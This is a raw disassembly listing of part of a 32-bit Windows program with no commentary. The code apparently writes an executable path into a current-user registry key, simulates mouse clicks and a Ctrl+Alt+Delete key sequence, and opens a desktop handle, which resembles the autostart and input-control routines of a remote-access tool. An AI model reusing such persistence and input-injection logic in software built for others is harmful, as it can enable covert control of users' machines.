  402e32:	6a 00                	push   $0x0
  402e34:	8b 15 80 d7 40 00    	mov    0x40d780,%edx
  402e3a:	52                   	push   %edx
  402e3b:	e8 d4 4a 00 00       	call   0x407914
  402e40:	83 c4 0c             	add    $0xc,%esp
  402e43:	8b 45 08             	mov    0x8(%ebp),%eax
  402e46:	8b 08                	mov    (%eax),%ecx
  402e48:	51                   	push   %ecx
  402e49:	8b 15 80 d7 40 00    	mov    0x40d780,%edx
  402e4f:	52                   	push   %edx
  402e50:	e8 b3 4a 00 00       	call   0x407908
  402e55:	83 c4 08             	add    $0x8,%esp
  402e58:	eb 54                	jmp    0x402eae
  402e5a:	68 04 01 00 00       	push   $0x104
  402e5f:	ff 15 28 91 40 00    	call   *0x409128
  402e65:	83 c4 04             	add    $0x4,%esp
  402e68:	a3 80 d7 40 00       	mov    %eax,0x40d780
  402e6d:	68 04 01 00 00       	push   $0x104
  402e72:	6a 00                	push   $0x0
  402e74:	a1 80 d7 40 00       	mov    0x40d780,%eax
  402e79:	50                   	push   %eax
  402e7a:	e8 95 4a 00 00       	call   0x407914
  402e7f:	83 c4 0c             	add    $0xc,%esp
  402e82:	68 04 01 00 00       	push   $0x104
  402e87:	8b 0d 80 d7 40 00    	mov    0x40d780,%ecx
  402e8d:	51                   	push   %ecx
  402e8e:	6a 00                	push   $0x0
  402e90:	ff 15 7c d7 40 00    	call   *0x40d77c
  402e96:	85 c0                	test   %eax,%eax
  402e98:	77 14                	ja     0x402eae
  402e9a:	8b 15 80 d7 40 00    	mov    0x40d780,%edx
  402ea0:	52                   	push   %edx
  402ea1:	ff 15 ac 90 40 00    	call   *0x4090ac
  402ea7:	83 c4 04             	add    $0x4,%esp
  402eaa:	32 c0                	xor    %al,%al
  402eac:	eb 66                	jmp    0x402f14
  402eae:	8b 45 08             	mov    0x8(%ebp),%eax
  402eb1:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402eb5:	74 5b                	je     0x402f12
  402eb7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402eba:	8b 51 04             	mov    0x4(%ecx),%edx
  402ebd:	52                   	push   %edx
  402ebe:	e8 9b 4a 00 00       	call   0x40795e
  402ec3:	83 c4 04             	add    $0x4,%esp
  402ec6:	83 c0 01             	add    $0x1,%eax
  402ec9:	50                   	push   %eax
  402eca:	ff 15 28 91 40 00    	call   *0x409128
  402ed0:	83 c4 04             	add    $0x4,%esp
  402ed3:	a3 84 d7 40 00       	mov    %eax,0x40d784
  402ed8:	8b 45 08             	mov    0x8(%ebp),%eax
  402edb:	8b 48 04             	mov    0x4(%eax),%ecx
  402ede:	51                   	push   %ecx
  402edf:	e8 7a 4a 00 00       	call   0x40795e
  402ee4:	83 c4 04             	add    $0x4,%esp
  402ee7:	83 c0 01             	add    $0x1,%eax
  402eea:	50                   	push   %eax
  402eeb:	6a 00                	push   $0x0
  402eed:	8b 15 84 d7 40 00    	mov    0x40d784,%edx
  402ef3:	52                   	push   %edx
  402ef4:	e8 1b 4a 00 00       	call   0x407914
  402ef9:	83 c4 0c             	add    $0xc,%esp
  402efc:	8b 45 08             	mov    0x8(%ebp),%eax
  402eff:	8b 48 04             	mov    0x4(%eax),%ecx
  402f02:	51                   	push   %ecx
  402f03:	8b 15 84 d7 40 00    	mov    0x40d784,%edx
  402f09:	52                   	push   %edx
  402f0a:	e8 f9 49 00 00       	call   0x407908
  402f0f:	83 c4 08             	add    $0x8,%esp
  402f12:	b0 01                	mov    $0x1,%al
  402f14:	5d                   	pop    %ebp
  402f15:	c3                   	ret
  402f16:	cc                   	int3
  402f17:	cc                   	int3
  402f18:	cc                   	int3
  402f19:	cc                   	int3
  402f1a:	cc                   	int3
  402f1b:	cc                   	int3
  402f1c:	cc                   	int3
  402f1d:	cc                   	int3
  402f1e:	cc                   	int3
  402f1f:	cc                   	int3
  402f20:	55                   	push   %ebp
  402f21:	8b ec                	mov    %esp,%ebp
  402f23:	83 3d 80 d7 40 00 00 	cmpl   $0x0,0x40d780
  402f2a:	74 0f                	je     0x402f3b
  402f2c:	a1 80 d7 40 00       	mov    0x40d780,%eax
  402f31:	50                   	push   %eax
  402f32:	ff 15 ac 90 40 00    	call   *0x4090ac
  402f38:	83 c4 04             	add    $0x4,%esp
  402f3b:	83 3d 84 d7 40 00 00 	cmpl   $0x0,0x40d784
  402f42:	74 10                	je     0x402f54
  402f44:	8b 0d 84 d7 40 00    	mov    0x40d784,%ecx
  402f4a:	51                   	push   %ecx
  402f4b:	ff 15 ac 90 40 00    	call   *0x4090ac
  402f51:	83 c4 04             	add    $0x4,%esp
  402f54:	b0 01                	mov    $0x1,%al
  402f56:	5d                   	pop    %ebp
  402f57:	c3                   	ret
  402f58:	cc                   	int3
  402f59:	cc                   	int3
  402f5a:	cc                   	int3
  402f5b:	cc                   	int3
  402f5c:	cc                   	int3
  402f5d:	cc                   	int3
  402f5e:	cc                   	int3
  402f5f:	cc                   	int3
  402f60:	55                   	push   %ebp
  402f61:	8b ec                	mov    %esp,%ebp
  402f63:	56                   	push   %esi
  402f64:	68 04 01 00 00       	push   $0x104
  402f69:	ff 15 28 91 40 00    	call   *0x409128
  402f6f:	83 c4 04             	add    $0x4,%esp
  402f72:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402f75:	89 01                	mov    %eax,(%ecx)
  402f77:	8b 55 08             	mov    0x8(%ebp),%edx
  402f7a:	8b 02                	mov    (%edx),%eax
  402f7c:	50                   	push   %eax
  402f7d:	68 04 01 00 00       	push   $0x104
  402f82:	ff 15 78 d7 40 00    	call   *0x40d778
  402f88:	85 c0                	test   %eax,%eax
  402f8a:	75 16                	jne    0x402fa2
  402f8c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402f8f:	8b 11                	mov    (%ecx),%edx
  402f91:	52                   	push   %edx
  402f92:	ff 15 ac 90 40 00    	call   *0x4090ac
  402f98:	83 c4 04             	add    $0x4,%esp
  402f9b:	32 c0                	xor    %al,%al
  402f9d:	e9 9c 00 00 00       	jmp    0x40303e
  402fa2:	6a 09                	push   $0x9
  402fa4:	ff 15 28 91 40 00    	call   *0x409128
  402faa:	83 c4 04             	add    $0x4,%esp
  402fad:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402fb0:	89 01                	mov    %eax,(%ecx)
  402fb2:	8b 55 0c             	mov    0xc(%ebp),%edx
  402fb5:	8b 02                	mov    (%edx),%eax
  402fb7:	50                   	push   %eax
  402fb8:	e8 03 fc ff ff       	call   0x402bc0
  402fbd:	83 c4 04             	add    $0x4,%esp
  402fc0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402fc3:	83 39 00             	cmpl   $0x0,(%ecx)
  402fc6:	74 39                	je     0x403001
  402fc8:	8b 55 0c             	mov    0xc(%ebp),%edx
  402fcb:	83 3a 00             	cmpl   $0x0,(%edx)
  402fce:	74 31                	je     0x403001
  402fd0:	8b 45 08             	mov    0x8(%ebp),%eax
  402fd3:	8b 08                	mov    (%eax),%ecx
  402fd5:	51                   	push   %ecx
  402fd6:	e8 83 49 00 00       	call   0x40795e
  402fdb:	83 c4 04             	add    $0x4,%esp
  402fde:	8b f0                	mov    %eax,%esi
  402fe0:	8b 55 0c             	mov    0xc(%ebp),%edx
  402fe3:	8b 02                	mov    (%edx),%eax
  402fe5:	50                   	push   %eax
  402fe6:	e8 73 49 00 00       	call   0x40795e
  402feb:	83 c4 04             	add    $0x4,%esp
  402fee:	8d 4c 06 0a          	lea    0xa(%esi,%eax,1),%ecx
  402ff2:	51                   	push   %ecx
  402ff3:	ff 15 28 91 40 00    	call   *0x409128
  402ff9:	83 c4 04             	add    $0x4,%esp
  402ffc:	8b 55 10             	mov    0x10(%ebp),%edx
  402fff:	89 02                	mov    %eax,(%edx)
  403001:	8b 45 08             	mov    0x8(%ebp),%eax
  403004:	8b 08                	mov    (%eax),%ecx
  403006:	51                   	push   %ecx
  403007:	8b 55 10             	mov    0x10(%ebp),%edx
  40300a:	8b 02                	mov    (%edx),%eax
  40300c:	50                   	push   %eax
  40300d:	e8 f6 48 00 00       	call   0x407908
  403012:	83 c4 08             	add    $0x8,%esp
  403015:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403018:	8b 11                	mov    (%ecx),%edx
  40301a:	52                   	push   %edx
  40301b:	8b 45 10             	mov    0x10(%ebp),%eax
  40301e:	8b 08                	mov    (%eax),%ecx
  403020:	51                   	push   %ecx
  403021:	e8 3e 49 00 00       	call   0x407964
  403026:	83 c4 08             	add    $0x8,%esp
  403029:	68 4c 99 40 00       	push   $0x40994c
  40302e:	8b 55 10             	mov    0x10(%ebp),%edx
  403031:	8b 02                	mov    (%edx),%eax
  403033:	50                   	push   %eax
  403034:	e8 2b 49 00 00       	call   0x407964
  403039:	83 c4 08             	add    $0x8,%esp
  40303c:	b0 01                	mov    $0x1,%al
  40303e:	5e                   	pop    %esi
  40303f:	5d                   	pop    %ebp
  403040:	c3                   	ret
  403041:	cc                   	int3
  403042:	cc                   	int3
  403043:	cc                   	int3
  403044:	cc                   	int3
  403045:	cc                   	int3
  403046:	cc                   	int3
  403047:	cc                   	int3
  403048:	cc                   	int3
  403049:	cc                   	int3
  40304a:	cc                   	int3
  40304b:	cc                   	int3
  40304c:	cc                   	int3
  40304d:	cc                   	int3
  40304e:	cc                   	int3
  40304f:	cc                   	int3
  403050:	55                   	push   %ebp
  403051:	8b ec                	mov    %esp,%ebp
  403053:	8b 45 08             	mov    0x8(%ebp),%eax
  403056:	83 38 00             	cmpl   $0x0,(%eax)
  403059:	74 0f                	je     0x40306a
  40305b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40305e:	8b 11                	mov    (%ecx),%edx
  403060:	52                   	push   %edx
  403061:	ff 15 ac 90 40 00    	call   *0x4090ac
  403067:	83 c4 04             	add    $0x4,%esp
  40306a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40306d:	83 38 00             	cmpl   $0x0,(%eax)
  403070:	74 0f                	je     0x403081
  403072:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403075:	8b 11                	mov    (%ecx),%edx
  403077:	52                   	push   %edx
  403078:	ff 15 ac 90 40 00    	call   *0x4090ac
  40307e:	83 c4 04             	add    $0x4,%esp
  403081:	8b 45 10             	mov    0x10(%ebp),%eax
  403084:	83 38 00             	cmpl   $0x0,(%eax)
  403087:	74 0f                	je     0x403098
  403089:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40308c:	8b 11                	mov    (%ecx),%edx
  40308e:	52                   	push   %edx
  40308f:	ff 15 ac 90 40 00    	call   *0x4090ac
  403095:	83 c4 04             	add    $0x4,%esp
  403098:	b0 01                	mov    $0x1,%al
  40309a:	5d                   	pop    %ebp
  40309b:	c3                   	ret
  40309c:	cc                   	int3
  40309d:	cc                   	int3
  40309e:	cc                   	int3
  40309f:	cc                   	int3
  4030a0:	55                   	push   %ebp
  4030a1:	8b ec                	mov    %esp,%ebp
  4030a3:	83 ec 14             	sub    $0x14,%esp
  4030a6:	56                   	push   %esi
  4030a7:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4030ae:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4030b5:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4030bc:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4030bf:	50                   	push   %eax
  4030c0:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4030c3:	51                   	push   %ecx
  4030c4:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4030c7:	52                   	push   %edx
  4030c8:	e8 93 fe ff ff       	call   0x402f60
  4030cd:	83 c4 0c             	add    $0xc,%esp
  4030d0:	0f b6 c0             	movzbl %al,%eax
  4030d3:	85 c0                	test   %eax,%eax
  4030d5:	75 20                	jne    0x4030f7
  4030d7:	e8 44 fe ff ff       	call   0x402f20
  4030dc:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4030df:	51                   	push   %ecx
  4030e0:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4030e3:	52                   	push   %edx
  4030e4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4030e7:	50                   	push   %eax
  4030e8:	e8 63 ff ff ff       	call   0x403050
  4030ed:	83 c4 0c             	add    $0xc,%esp
  4030f0:	32 c0                	xor    %al,%al
  4030f2:	e9 37 01 00 00       	jmp    0x40322e
  4030f7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4030fa:	51                   	push   %ecx
  4030fb:	e8 70 fc ff ff       	call   0x402d70
  403100:	83 c4 04             	add    $0x4,%esp
  403103:	0f b6 d0             	movzbl %al,%edx
  403106:	85 d2                	test   %edx,%edx
  403108:	75 17                	jne    0x403121
  40310a:	6a 00                	push   $0x0
  40310c:	6a 00                	push   $0x0
  40310e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403111:	50                   	push   %eax
  403112:	e8 89 fc ff ff       	call   0x402da0
  403117:	83 c4 0c             	add    $0xc,%esp
  40311a:	32 c0                	xor    %al,%al
  40311c:	e9 0d 01 00 00       	jmp    0x40322e
  403121:	83 3d 84 d7 40 00 00 	cmpl   $0x0,0x40d784
  403128:	0f 84 94 00 00 00    	je     0x4031c2
  40312e:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403131:	51                   	push   %ecx
  403132:	e8 27 48 00 00       	call   0x40795e
  403137:	83 c4 04             	add    $0x4,%esp
  40313a:	8b f0                	mov    %eax,%esi
  40313c:	8b 15 84 d7 40 00    	mov    0x40d784,%edx
  403142:	52                   	push   %edx
  403143:	e8 16 48 00 00       	call   0x40795e
  403148:	83 c4 04             	add    $0x4,%esp
  40314b:	8d 44 06 0a          	lea    0xa(%esi,%eax,1),%eax
  40314f:	50                   	push   %eax
  403150:	ff 15 28 91 40 00    	call   *0x409128
  403156:	83 c4 04             	add    $0x4,%esp
  403159:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40315c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40315f:	51                   	push   %ecx
  403160:	e8 f9 47 00 00       	call   0x40795e
  403165:	83 c4 04             	add    $0x4,%esp
  403168:	8b f0                	mov    %eax,%esi
  40316a:	8b 15 84 d7 40 00    	mov    0x40d784,%edx
  403170:	52                   	push   %edx
  403171:	e8 e8 47 00 00       	call   0x40795e
  403176:	83 c4 04             	add    $0x4,%esp
  403179:	8d 44 06 0a          	lea    0xa(%esi,%eax,1),%eax
  40317d:	50                   	push   %eax
  40317e:	6a 00                	push   $0x0
  403180:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403183:	51                   	push   %ecx
  403184:	e8 8b 47 00 00       	call   0x407914
  403189:	83 c4 0c             	add    $0xc,%esp
  40318c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40318f:	52                   	push   %edx
  403190:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403193:	50                   	push   %eax
  403194:	e8 6f 47 00 00       	call   0x407908
  403199:	83 c4 08             	add    $0x8,%esp
  40319c:	68 54 99 40 00       	push   $0x409954
  4031a1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4031a4:	51                   	push   %ecx
  4031a5:	e8 ba 47 00 00       	call   0x407964
  4031aa:	83 c4 08             	add    $0x8,%esp
  4031ad:	8b 15 84 d7 40 00    	mov    0x40d784,%edx
  4031b3:	52                   	push   %edx
  4031b4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4031b7:	50                   	push   %eax
  4031b8:	e8 a7 47 00 00       	call   0x407964
  4031bd:	83 c4 08             	add    $0x8,%esp
  4031c0:	eb 06                	jmp    0x4031c8
  4031c2:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4031c5:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4031c8:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4031cb:	52                   	push   %edx
  4031cc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4031cf:	50                   	push   %eax
  4031d0:	68 58 99 40 00       	push   $0x409958
  4031d5:	68 01 00 00 80       	push   $0x80000001
  4031da:	e8 61 f7 ff ff       	call   0x402940
  4031df:	83 c4 10             	add    $0x10,%esp
  4031e2:	88 45 ff             	mov    %al,-0x1(%ebp)
  4031e5:	0f b6 4d ff          	movzbl -0x1(%ebp),%ecx
  4031e9:	85 c9                	test   %ecx,%ecx
  4031eb:	75 14                	jne    0x403201
  4031ed:	6a 00                	push   $0x0
  4031ef:	6a 00                	push   $0x0
  4031f1:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4031f4:	52                   	push   %edx
  4031f5:	e8 a6 fb ff ff       	call   0x402da0
  4031fa:	83 c4 0c             	add    $0xc,%esp
  4031fd:	32 c0                	xor    %al,%al
  4031ff:	eb 2d                	jmp    0x40322e
  403201:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403204:	50                   	push   %eax
  403205:	6a 01                	push   $0x1
  403207:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40320a:	51                   	push   %ecx
  40320b:	e8 90 fb ff ff       	call   0x402da0
  403210:	83 c4 0c             	add    $0xc,%esp
  403213:	e8 08 fd ff ff       	call   0x402f20
  403218:	8d 55 ec             	lea    -0x14(%ebp),%edx
  40321b:	52                   	push   %edx
  40321c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40321f:	50                   	push   %eax
  403220:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  403223:	51                   	push   %ecx
  403224:	e8 27 fe ff ff       	call   0x403050
  403229:	83 c4 0c             	add    $0xc,%esp
  40322c:	b0 01                	mov    $0x1,%al
  40322e:	5e                   	pop    %esi
  40322f:	8b e5                	mov    %ebp,%esp
  403231:	5d                   	pop    %ebp
  403232:	c3                   	ret
  403233:	cc                   	int3
  403234:	cc                   	int3
  403235:	cc                   	int3
  403236:	cc                   	int3
  403237:	cc                   	int3
  403238:	cc                   	int3
  403239:	cc                   	int3
  40323a:	cc                   	int3
  40323b:	cc                   	int3
  40323c:	cc                   	int3
  40323d:	cc                   	int3
  40323e:	cc                   	int3
  40323f:	cc                   	int3
  403240:	55                   	push   %ebp
  403241:	8b ec                	mov    %esp,%ebp
  403243:	e8 18 00 00 00       	call   0x403260
  403248:	8b 45 0c             	mov    0xc(%ebp),%eax
  40324b:	50                   	push   %eax
  40324c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40324f:	51                   	push   %ecx
  403250:	ff 15 c8 d8 40 00    	call   *0x40d8c8
  403256:	5d                   	pop    %ebp
  403257:	c2 08 00             	ret    $0x8
  40325a:	cc                   	int3
  40325b:	cc                   	int3
  40325c:	cc                   	int3
  40325d:	cc                   	int3
  40325e:	cc                   	int3
  40325f:	cc                   	int3
  403260:	55                   	push   %ebp
  403261:	8b ec                	mov    %esp,%ebp
  403263:	83 3d 10 d9 40 00 00 	cmpl   $0x0,0x40d910
  40326a:	75 17                	jne    0x403283
  40326c:	68 88 d7 40 00       	push   $0x40d788
  403271:	e8 3a e5 ff ff       	call   0x4017b0
  403276:	83 c4 04             	add    $0x4,%esp
  403279:	c7 05 10 d9 40 00 01 	movl   $0x1,0x40d910
  403280:	00 00 00 
  403283:	5d                   	pop    %ebp
  403284:	c3                   	ret
  403285:	cc                   	int3
  403286:	cc                   	int3
  403287:	cc                   	int3
  403288:	cc                   	int3
  403289:	cc                   	int3
  40328a:	cc                   	int3
  40328b:	cc                   	int3
  40328c:	cc                   	int3
  40328d:	cc                   	int3
  40328e:	cc                   	int3
  40328f:	cc                   	int3
  403290:	55                   	push   %ebp
  403291:	8b ec                	mov    %esp,%ebp
  403293:	e8 c8 ff ff ff       	call   0x403260
  403298:	8b 45 0c             	mov    0xc(%ebp),%eax
  40329b:	50                   	push   %eax
  40329c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40329f:	51                   	push   %ecx
  4032a0:	e8 9b ff ff ff       	call   0x403240
  4032a5:	6a 00                	push   $0x0
  4032a7:	6a 00                	push   $0x0
  4032a9:	8b 55 0c             	mov    0xc(%ebp),%edx
  4032ac:	52                   	push   %edx
  4032ad:	8b 45 08             	mov    0x8(%ebp),%eax
  4032b0:	50                   	push   %eax
  4032b1:	6a 02                	push   $0x2
  4032b3:	ff 15 d0 d8 40 00    	call   *0x40d8d0
  4032b9:	5d                   	pop    %ebp
  4032ba:	c2 08 00             	ret    $0x8
  4032bd:	cc                   	int3
  4032be:	cc                   	int3
  4032bf:	cc                   	int3
  4032c0:	55                   	push   %ebp
  4032c1:	8b ec                	mov    %esp,%ebp
  4032c3:	e8 98 ff ff ff       	call   0x403260
  4032c8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4032cb:	50                   	push   %eax
  4032cc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4032cf:	51                   	push   %ecx
  4032d0:	e8 6b ff ff ff       	call   0x403240
  4032d5:	6a 00                	push   $0x0
  4032d7:	6a 00                	push   $0x0
  4032d9:	8b 55 0c             	mov    0xc(%ebp),%edx
  4032dc:	52                   	push   %edx
  4032dd:	8b 45 08             	mov    0x8(%ebp),%eax
  4032e0:	50                   	push   %eax
  4032e1:	6a 04                	push   $0x4
  4032e3:	ff 15 d0 d8 40 00    	call   *0x40d8d0
  4032e9:	5d                   	pop    %ebp
  4032ea:	c2 08 00             	ret    $0x8
  4032ed:	cc                   	int3
  4032ee:	cc                   	int3
  4032ef:	cc                   	int3
  4032f0:	55                   	push   %ebp
  4032f1:	8b ec                	mov    %esp,%ebp
  4032f3:	e8 68 ff ff ff       	call   0x403260
  4032f8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4032fb:	50                   	push   %eax
  4032fc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4032ff:	51                   	push   %ecx
  403300:	e8 3b ff ff ff       	call   0x403240
  403305:	6a 00                	push   $0x0
  403307:	6a 00                	push   $0x0
  403309:	8b 55 0c             	mov    0xc(%ebp),%edx
  40330c:	52                   	push   %edx
  40330d:	8b 45 08             	mov    0x8(%ebp),%eax
  403310:	50                   	push   %eax
  403311:	6a 08                	push   $0x8
  403313:	ff 15 d0 d8 40 00    	call   *0x40d8d0
  403319:	5d                   	pop    %ebp
  40331a:	c2 08 00             	ret    $0x8
  40331d:	cc                   	int3
  40331e:	cc                   	int3
  40331f:	cc                   	int3
  403320:	55                   	push   %ebp
  403321:	8b ec                	mov    %esp,%ebp
  403323:	e8 38 ff ff ff       	call   0x403260
  403328:	8b 45 0c             	mov    0xc(%ebp),%eax
  40332b:	50                   	push   %eax
  40332c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40332f:	51                   	push   %ecx
  403330:	e8 0b ff ff ff       	call   0x403240
  403335:	6a 00                	push   $0x0
  403337:	6a 00                	push   $0x0
  403339:	8b 55 0c             	mov    0xc(%ebp),%edx
  40333c:	52                   	push   %edx
  40333d:	8b 45 08             	mov    0x8(%ebp),%eax
  403340:	50                   	push   %eax
  403341:	6a 10                	push   $0x10
  403343:	ff 15 d0 d8 40 00    	call   *0x40d8d0
  403349:	5d                   	pop    %ebp
  40334a:	c2 08 00             	ret    $0x8
  40334d:	cc                   	int3
  40334e:	cc                   	int3
  40334f:	cc                   	int3
  403350:	55                   	push   %ebp
  403351:	8b ec                	mov    %esp,%ebp
  403353:	8b 45 0c             	mov    0xc(%ebp),%eax
  403356:	50                   	push   %eax
  403357:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40335a:	51                   	push   %ecx
  40335b:	e8 e0 fe ff ff       	call   0x403240
  403360:	8b 55 0c             	mov    0xc(%ebp),%edx
  403363:	52                   	push   %edx
  403364:	8b 45 08             	mov    0x8(%ebp),%eax
  403367:	50                   	push   %eax
  403368:	e8 23 ff ff ff       	call   0x403290
  40336d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403370:	51                   	push   %ecx
  403371:	8b 55 08             	mov    0x8(%ebp),%edx
  403374:	52                   	push   %edx
  403375:	e8 46 ff ff ff       	call   0x4032c0
  40337a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40337d:	50                   	push   %eax
  40337e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403381:	51                   	push   %ecx
  403382:	e8 09 ff ff ff       	call   0x403290
  403387:	8b 55 0c             	mov    0xc(%ebp),%edx
  40338a:	52                   	push   %edx
  40338b:	8b 45 08             	mov    0x8(%ebp),%eax
  40338e:	50                   	push   %eax
  40338f:	e8 2c ff ff ff       	call   0x4032c0
  403394:	5d                   	pop    %ebp
  403395:	c2 08 00             	ret    $0x8
  403398:	cc                   	int3
  403399:	cc                   	int3
  40339a:	cc                   	int3
  40339b:	cc                   	int3
  40339c:	cc                   	int3
  40339d:	cc                   	int3
  40339e:	cc                   	int3
  40339f:	cc                   	int3
  4033a0:	55                   	push   %ebp
  4033a1:	8b ec                	mov    %esp,%ebp
  4033a3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4033a6:	50                   	push   %eax
  4033a7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4033aa:	51                   	push   %ecx
  4033ab:	e8 90 fe ff ff       	call   0x403240
  4033b0:	8b 55 0c             	mov    0xc(%ebp),%edx
  4033b3:	52                   	push   %edx
  4033b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4033b7:	50                   	push   %eax
  4033b8:	e8 33 ff ff ff       	call   0x4032f0
  4033bd:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4033c0:	51                   	push   %ecx
  4033c1:	8b 55 08             	mov    0x8(%ebp),%edx
  4033c4:	52                   	push   %edx
  4033c5:	e8 56 ff ff ff       	call   0x403320
  4033ca:	8b 45 0c             	mov    0xc(%ebp),%eax
  4033cd:	50                   	push   %eax
  4033ce:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4033d1:	51                   	push   %ecx
  4033d2:	e8 19 ff ff ff       	call   0x4032f0
  4033d7:	8b 55 0c             	mov    0xc(%ebp),%edx
  4033da:	52                   	push   %edx
  4033db:	8b 45 08             	mov    0x8(%ebp),%eax
  4033de:	50                   	push   %eax
  4033df:	e8 3c ff ff ff       	call   0x403320
  4033e4:	5d                   	pop    %ebp
  4033e5:	c2 08 00             	ret    $0x8
  4033e8:	cc                   	int3
  4033e9:	cc                   	int3
  4033ea:	cc                   	int3
  4033eb:	cc                   	int3
  4033ec:	cc                   	int3
  4033ed:	cc                   	int3
  4033ee:	cc                   	int3
  4033ef:	cc                   	int3
  4033f0:	55                   	push   %ebp
  4033f1:	8b ec                	mov    %esp,%ebp
  4033f3:	e8 68 fe ff ff       	call   0x403260
  4033f8:	6a 00                	push   $0x0
  4033fa:	6a 00                	push   $0x0
  4033fc:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  403400:	50                   	push   %eax
  403401:	0f b6 4d 08          	movzbl 0x8(%ebp),%ecx
  403405:	51                   	push   %ecx
  403406:	ff 15 cc d8 40 00    	call   *0x40d8cc
  40340c:	5d                   	pop    %ebp
  40340d:	c2 08 00             	ret    $0x8
  403410:	55                   	push   %ebp
  403411:	8b ec                	mov    %esp,%ebp
  403413:	e8 48 fe ff ff       	call   0x403260
  403418:	6a 00                	push   $0x0
  40341a:	6a 02                	push   $0x2
  40341c:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  403420:	50                   	push   %eax
  403421:	0f b6 4d 08          	movzbl 0x8(%ebp),%ecx
  403425:	51                   	push   %ecx
  403426:	ff 15 cc d8 40 00    	call   *0x40d8cc
  40342c:	5d                   	pop    %ebp
  40342d:	c2 08 00             	ret    $0x8
  403430:	55                   	push   %ebp
  403431:	8b ec                	mov    %esp,%ebp
  403433:	e8 28 fe ff ff       	call   0x403260
  403438:	6a 00                	push   $0x0
  40343a:	6a 11                	push   $0x11
  40343c:	e8 af ff ff ff       	call   0x4033f0
  403441:	6a 00                	push   $0x0
  403443:	6a 12                	push   $0x12
  403445:	e8 a6 ff ff ff       	call   0x4033f0
  40344a:	6a 00                	push   $0x0
  40344c:	6a 2e                	push   $0x2e
  40344e:	e8 9d ff ff ff       	call   0x4033f0
  403453:	68 d0 07 00 00       	push   $0x7d0
  403458:	ff 15 a0 d8 40 00    	call   *0x40d8a0
  40345e:	6a 00                	push   $0x0
  403460:	6a 11                	push   $0x11
  403462:	e8 a9 ff ff ff       	call   0x403410
  403467:	6a 00                	push   $0x0
  403469:	6a 12                	push   $0x12
  40346b:	e8 a0 ff ff ff       	call   0x403410
  403470:	6a 00                	push   $0x0
  403472:	6a 2e                	push   $0x2e
  403474:	e8 97 ff ff ff       	call   0x403410
  403479:	5d                   	pop    %ebp
  40347a:	c3                   	ret
  40347b:	cc                   	int3
  40347c:	cc                   	int3
  40347d:	cc                   	int3
  40347e:	cc                   	int3
  40347f:	cc                   	int3
  403480:	55                   	push   %ebp
  403481:	8b ec                	mov    %esp,%ebp
  403483:	83 ec 30             	sub    $0x30,%esp
  403486:	e8 d5 fd ff ff       	call   0x403260
  40348b:	8d 45 08             	lea    0x8(%ebp),%eax
  40348e:	50                   	push   %eax
  40348f:	ff 15 d4 d8 40 00    	call   *0x40d8d4
  403495:	85 c0                	test   %eax,%eax
  403497:	74 07                	je     0x4034a0
  403499:	33 c0                	xor    %eax,%eax
  40349b:	e9 14 01 00 00       	jmp    0x4035b4
  4034a0:	6a 00                	push   $0x0
  4034a2:	6a 00                	push   $0x0
  4034a4:	6a 00                	push   $0x0
  4034a6:	68 88 99 40 00       	push   $0x409988
  4034ab:	ff 15 ec d8 40 00    	call   *0x40d8ec
  4034b1:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4034b4:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4034b7:	51                   	push   %ecx
  4034b8:	ff 15 f0 d8 40 00    	call   *0x40d8f0
  4034be:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4034c1:	8b 55 08             	mov    0x8(%ebp),%edx
